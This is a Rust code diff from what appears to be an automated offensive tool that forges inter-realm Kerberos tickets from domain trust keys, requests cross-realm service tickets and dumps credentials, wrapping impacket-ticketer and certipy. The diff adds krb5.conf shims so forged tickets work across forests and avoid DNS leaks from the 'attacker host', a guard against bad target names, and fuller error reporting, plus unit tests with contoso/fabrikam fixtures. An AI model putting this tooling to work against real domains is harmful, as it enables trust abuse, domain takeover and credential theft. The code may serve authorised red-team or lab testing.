@@ -224,6 +224,65 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
                         }
                     }
                 }
+
+                let certipy_ccache = certipy_ccache_path_for(&ccache_path);
+                let res = CommandBuilder::new("python3")
+                    .arg(helper_path.to_string_lossy().into_owned())
+                    .flag("--in-ccache", ccache_path.to_string_lossy().into_owned())
+                    .flag(
+                        "--out-ccache",
+                        certipy_ccache.to_string_lossy().into_owned(),
+                    )
+                    .flag("--target-realm", target_domain.to_uppercase())
+                    .arg("--rehome-realm")
+                    .current_dir(&ticket_dir)
+                    .timeout_secs(60)
+                    .execute()
+                    .await;
+                match res {
+                    Ok(rehome_out) => {
+                        output.stdout.push_str(&format!(
+                            "\n=== certipy ccache re-home ===\n{}\n{}\n",
+                            rehome_out.stdout, rehome_out.stderr
+                        ));
+                    }
+                    Err(e) => {
+                        output
+                            .stdout
+                            .push_str(&format!("\n[!] certipy ccache re-home errored: {e}\n"));
+                    }
+                }
+            }
+        }
+    }
+
+    // Write a companion krb5.conf shim alongside the ccache. Without
+    // `[domain_realm]` mappings for `.<target_domain>`, MIT libkrb5 falls
+    // back to `default_realm` (`EC2.INTERNAL` on the ares AMI) when
+    // resolving `ldap/<target-dc>` and misses the cached service ticket
+    // with `Matching credential not found` — every cross-forest GSSAPI
+    // call fails despite a valid ccache. Every wrapper that sets
+    // `KRB5CCNAME=<ccache>` also sets `KRB5_CONFIG=<ccache>.krb5.conf:
+    // /etc/krb5.conf`, so the shim only affects GSSAPI calls that carry
+    // this ccache.
+    if ccache_path.exists() {
+        let shim = build_krb5_shim(&[
+            (source_domain.to_string(), source_domain.to_uppercase()),
+            (target_domain.to_string(), target_domain.to_uppercase()),
+        ]);
+        let certipy_ccache = certipy_ccache_path_for(&ccache_path);
+        let shim_targets = [
+            Some(krb5_shim_path_for(&ccache_path)),
+            certipy_ccache
+                .exists()
+                .then(|| krb5_shim_path_for(&certipy_ccache)),
+        ];
+        for shim_path in shim_targets.into_iter().flatten() {
+            if let Err(e) = std::fs::write(&shim_path, &shim) {
+                output.stdout.push_str(&format!(
+                    "\n[!] failed to write krb5.conf shim at {}: {e}\n",
+                    shim_path.display()
+                ));
             }
         }
     }
@@ -236,6 +295,52 @@ pub async fn create_inter_realm_ticket(args: &Value) -> Result<ToolOutput> {
     }
 
     Ok(output)
+}
+
+/// Path where the krb5.conf shim companion to `ccache_path` lives.
+///
+/// Convention: append `.krb5.conf` to the ccache path. Every consumer that
+/// exports `KRB5CCNAME=<ccache>` also exports
+/// `KRB5_CONFIG=<ccache>.krb5.conf:/etc/krb5.conf`. Colon fallback so a
+/// missing shim doesn't nuke the system krb5.conf.
+pub fn krb5_shim_path_for(ccache_path: &std::path::Path) -> std::path::PathBuf {
+    let mut s = ccache_path.as_os_str().to_owned();
+    s.push(".krb5.conf");
+    std::path::PathBuf::from(s)
+}
+
+pub fn certipy_ccache_path_for(ccache_path: &std::path::Path) -> std::path::PathBuf {
+    let mut s = ccache_path.as_os_str().to_owned();
+    s.push(".certipy");
+    std::path::PathBuf::from(s)
+}
+
+/// Build the krb5.conf content mapping each (domain, realm) pair through
+/// `[domain_realm]`. `default_realm` is the first entry — the first entry
+/// SHOULD be the source realm (the ccache's default principal's realm)
+/// so MIT resolves unspecified realms to it. `dns_lookup_realm = false`
+/// prevents MIT from trying DNS `_kerberos.<domain>` lookups that would
+/// leak to the internet from the attacker host.
+fn build_krb5_shim(entries: &[(String, String)]) -> String {
+    let default_realm = entries
+        .first()
+        .map(|(_, r)| r.as_str())
+        .unwrap_or("EMPTY.REALM");
+    let mut out = String::new();
+    out.push_str("# ares-managed krb5.conf shim — regenerated per ticket forge.\n");
+    out.push_str("[libdefaults]\n");
+    out.push_str(&format!("    default_realm = {default_realm}\n"));
+    out.push_str("    dns_lookup_realm = false\n");
+    out.push_str("    dns_lookup_kdc = false\n");
+    out.push_str("    rdns = false\n");
+    out.push_str("    forwardable = true\n\n");
+    out.push_str("[domain_realm]\n");
+    for (domain, realm) in entries {
+        let d_lc = domain.to_lowercase();
+        out.push_str(&format!("    .{d_lc} = {realm}\n"));
+        out.push_str(&format!("    {d_lc} = {realm}\n"));
+    }
+    out
 }
 
 /// Forge an inter-realm Kerberos ticket, request a TGS for the target DC,
@@ -277,6 +382,17 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
     let source_domain = required_str(args, "source_domain")?;
     let target_domain = required_str(args, "target_domain")?;
     let target = required_str(args, "target")?;
+
+    // Zone-apex guard: `target` is the host portion of `cifs/<target>` in the
+    // TGS-REQ. If it equals the target realm (or is a bare 2-label domain
+    // matching `target_domain`), the KDC has no service principal registered
+    // there and returns KDC_ERR_S_PRINCIPAL_UNKNOWN. Fail fast so the dispatch
+    // wrapper can lock dedup instead of clearing it and hot-looping.
+    if target.eq_ignore_ascii_case(target_domain) {
+        anyhow::bail!(
+            "forge_inter_realm_and_dump: target ({target}) is the realm apex; caller must resolve a DC FQDN like dc01.{target_domain} before dispatch — bare-domain SPN cifs/{target_domain} is not registered and yields KDC_ERR_S_PRINCIPAL_UNKNOWN"
+        );
+    }
     // target_sid currently unused by ticketer but accepted for API parity
     // with create_inter_realm_ticket; ticketer derives the realm from -domain.
     let _target_sid = optional_str(args, "target_sid");
@@ -313,9 +429,19 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
 
     let tgt_ccache = cwd.join(format!("{username}.ccache"));
     if !tgt_ccache.exists() {
+        // ticketer exited 0 but no ccache landed on disk: a "Pick only one"
+        // flag conflict, an odd-length/malformed hash, or a username/case
+        // mismatch between our expected filename and the `Saving ticket in
+        // <name>.ccache` line ticketer actually wrote. Surface ticketer's own
+        // output so the reason is visible on attempt 1 instead of a bare "not
+        // produced" that costs blind retries (same swallow as the ADCS req
+        // path — see privesc/adcs.rs).
         anyhow::bail!(
-            "impacket-ticketer reported success but {} was not produced",
-            tgt_ccache.display()
+            "impacket-ticketer exited 0 but {} was not produced — inter-realm TGT NOT forged. \
+             ticketer stdout: {} || stderr: {}",
+            tgt_ccache.display(),
+            ticketer_output.stdout.trim(),
+            ticketer_output.stderr.trim(),
         );
     }
 
@@ -360,9 +486,18 @@ pub async fn forge_inter_realm_and_dump(args: &Value) -> Result<ToolOutput> {
     }
 
     if !tgs_ccache.exists() {
+        // Same swallow one step later: the helper exited 0 but wrote no TGS
+        // ccache. Surface both the ticketer and helper output so the real
+        // cause (KDC_ERR_S_PRINCIPAL_UNKNOWN from a bad SPN, KDC_ERR_WRONG_REALM,
+        // or an unresolvable target KDC) is diagnosable instead of a bare "not
+        // produced".
         anyhow::bail!(
-            "cross_realm_tgs helper reported success but {} was not produced",
-            tgs_ccache.display()
+            "cross_realm_tgs helper exited 0 but {} was not produced — cross-realm TGS NOT obtained. \
+             ticketer stdout: {} || cross_realm_tgs stdout: {} || stderr: {}",
+            tgs_ccache.display(),
+            ticketer_output.stdout.trim(),
+            getst_output.stdout.trim(),
+            getst_output.stderr.trim(),
         );
     }
 
@@ -478,7 +613,74 @@ mod tests {
     use crate::args::{optional_str, required_str};
     use serde_json::json;
 
-    // --- extract_trust_key ---
+    #[test]
+    fn krb5_shim_path_appends_krb5_conf_suffix() {
+        let cc = std::path::PathBuf::from(
+            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache",
+        );
+        let shim = super::krb5_shim_path_for(&cc);
+        assert_eq!(
+            shim.to_string_lossy(),
+            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache.krb5.conf"
+        );
+    }
+
+    #[test]
+    fn certipy_ccache_path_appends_certipy_suffix() {
+        let cc = std::path::PathBuf::from(
+            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache",
+        );
+        let certipy = super::certipy_ccache_path_for(&cc);
+        assert_eq!(
+            certipy.to_string_lossy(),
+            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache.certipy"
+        );
+        assert_ne!(certipy.extension().and_then(|e| e.to_str()), Some("ccache"));
+    }
+
+    #[test]
+    fn certipy_ccache_gets_its_own_krb5_shim_path() {
+        let cc = std::path::PathBuf::from(
+            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache",
+        );
+        let shim = super::krb5_shim_path_for(&super::certipy_ccache_path_for(&cc));
+        assert_eq!(
+            shim.to_string_lossy(),
+            "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache.certipy.krb5.conf"
+        );
+    }
+
+    #[test]
+    fn krb5_shim_maps_every_domain_to_its_realm() {
+        // Cross-forest case: source + target both listed under [domain_realm]
+        // so MIT libkrb5 can resolve ldap/<target-dc> → TARGET.REALM and hit
+        // the cached service ticket. default_realm is the first entry.
+        let out = super::build_krb5_shim(&[
+            ("contoso.local".into(), "CONTOSO.LOCAL".into()),
+            ("fabrikam.local".into(), "FABRIKAM.LOCAL".into()),
+        ]);
+        assert!(
+            out.contains("default_realm = CONTOSO.LOCAL"),
+            "default_realm should be the first entry, got: {out}"
+        );
+        assert!(
+            out.contains("dns_lookup_realm = false"),
+            "must disable DNS realm lookup to prevent attacker-host DNS leaks"
+        );
+        for (want_domain, want_realm) in [
+            ("contoso.local", "CONTOSO.LOCAL"),
+            ("fabrikam.local", "FABRIKAM.LOCAL"),
+        ] {
+            assert!(
+                out.contains(&format!(".{want_domain} = {want_realm}")),
+                "missing wildcard domain_realm entry `.{want_domain} = {want_realm}` in: {out}"
+            );
+            assert!(
+                out.contains(&format!("{want_domain} = {want_realm}")),
+                "missing exact domain_realm entry `{want_domain} = {want_realm}` in: {out}"
+            );
+        }
+    }
 
     #[test]
     fn extract_trust_key_missing_trusted_domain() {
@@ -515,8 +717,6 @@ mod tests {
         let just_dc_user = format!("{trusted_domain}$");
         assert_eq!(just_dc_user, "child.contoso.local$");
     }
-
-    // --- create_inter_realm_ticket ---
 
     #[test]
     fn create_inter_realm_ticket_missing_trust_key() {
@@ -608,8 +808,6 @@ mod tests {
         assert_eq!(username, "fakeuser");
     }
 
-    // --- get_sid ---
-
     #[test]
     fn get_sid_missing_domain() {
         let args = json!({
@@ -694,8 +892,6 @@ mod tests {
         assert_eq!(hash, Some("31d6cfe0d16ae931b73c59d7e0c089c0"));
     }
 
-    // --- dnstool ---
-
     #[test]
     fn dnstool_missing_record_name() {
         let args = json!({
@@ -764,8 +960,6 @@ mod tests {
         let user_spec = format!("{domain}\\{username}");
         assert_eq!(user_spec, "contoso.local\\admin");
     }
-
-    // --- mock executor tests ---
 
     use super::*;
     use crate::executor::mock;
@@ -853,6 +1047,29 @@ mod tests {
         let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("target"));
+    }
+
+    #[test]
+    fn forge_inter_realm_and_dump_rejects_apex_target() {
+        // `target` becomes the host portion of `cifs/<target>` in the TGS-REQ.
+        // Passing the realm apex yields KDC_ERR_S_PRINCIPAL_UNKNOWN and, with
+        // the dispatch wrapper's default retry policy, a hot loop. Fail fast
+        // so the wrapper's apex-detection branch locks dedup instead.
+        let args = json!({
+            "trust_key": "aabbccdd",
+            "source_sid": "S-1-5-21-111",
+            "source_domain": "child.contoso.local",
+            "target_domain": "contoso.local",
+            "target": "contoso.local"
+        });
+        let rt = tokio::runtime::Runtime::new().unwrap();
+        let result = rt.block_on(super::forge_inter_realm_and_dump(&args));
+        assert!(result.is_err());
+        let msg = result.unwrap_err().to_string();
+        assert!(
+            msg.contains("realm apex") && msg.contains("KDC_ERR_S_PRINCIPAL_UNKNOWN"),
+            "expected apex-guard error, got: {msg}"
+        );
     }
 
     #[tokio::test]
